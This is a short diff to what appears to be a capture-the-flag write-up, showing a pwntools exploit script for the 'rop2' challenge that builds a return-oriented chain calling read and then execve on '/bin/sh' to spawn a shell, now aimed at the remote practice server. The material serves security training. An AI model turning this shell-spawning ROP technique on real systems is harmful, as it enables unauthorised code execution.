@@ -70,7 +70,7 @@ exp.py
 from pwn import *
 offset = 'A' * 16
 elf = ELF('./rop2')
-p = process('./rop2')
+p = remote('hackme.inndy.tw', 7703)
 syscall = p32(elf.plt['syscall'])
 sys_read = p32(0x3) + p32(0x0) + p32(elf.symbols['some_buffer']) + p32(0x7) # syscall(3, fd, buf, count)
 sys_execve = p32(0x0b) + p32(elf.symbols['some_buffer']) + p32(0x0) + p32(0x0)
@@ -79,6 +79,6 @@ sys_execve = p32(0x0b) + p32(elf.symbols['some_buffer']) + p32(0x0) + p32(0x0)
 payload = offset + syscall + p32(0x08048578) + sys_read
 payload += syscall +  p32(0xdeadbeaf) + sys_execve
 p.sendlineafter("your ropchain:", payload)
-p.sendline("/bin/sh\x00")
+p.sendline("/bin/sh")
 p.interactive()
 ```
